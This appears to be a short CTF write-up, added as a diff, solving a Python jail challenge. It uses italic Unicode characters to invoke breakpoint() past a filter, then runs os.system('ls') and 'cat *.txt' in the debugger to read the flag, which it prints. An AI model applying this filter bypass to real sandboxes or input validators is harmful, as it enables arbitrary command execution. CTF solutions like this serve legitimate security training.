@@ -1,0 +1,19 @@
+𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()
+payload with unicode chars, in this case I use italic chars.
+
+nc gzcli.1pc.tf 49215
+Input pls𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()
+--Return--
+> <string>(1)<module>()->None
+(Pdb) 
+(Pdb) import os
+(Pdb) os.system("ls")
+chall.py
+flag.txt
+run.sh
+0
+(Pdb) os.system("cat *.txt")
+RAMADAN{pyj41l_br34k_w1th_builtins_4nd_3v4l}0
+(Pdb) 
+
+RAMADAN{pyj41l_br34k_w1th_builtins_4nd_3v4l}
